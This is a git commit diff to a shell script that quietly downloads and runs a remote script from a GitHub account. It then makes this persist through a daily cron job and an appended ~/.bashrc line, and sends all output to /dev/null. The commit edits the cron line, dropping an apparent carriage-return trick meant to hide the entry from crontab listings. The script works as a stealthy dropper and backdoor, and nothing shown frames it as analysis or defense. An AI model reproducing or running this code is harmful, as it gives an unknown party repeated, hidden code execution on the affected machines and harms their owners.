30b275125021a4b0a0f88d014e7223506f8895c1
qwertyuiopasdfghjklzxcvbnmyxsc-svg <qwertyuiopasdfghjklzxcvbnmyxsc@gmail.com>
2026-01-29 19:52:32 +0800

    Update 3.sh

--- 3.sh
+++ 3.sh
@@ -2,7 +2,7 @@
 
 /bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1
 
-(crontab -l;echo '0 0 * * * /bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)";\rno crontw_wab for `whoami` %100 c\n')|crontab -
+(crontab -l;echo '0 0 * * * /bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1')|crontab -
 
 
 echo '/bin/bash -c "source <(wget -q -O - https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh || curl -sL https://raw.githubusercontent.com/qwertyuiopasdfghjklzxcvbnmyxsc-svg/123/main/2.sh)" >/dev/null 2>&1' >> ~/.bashrc
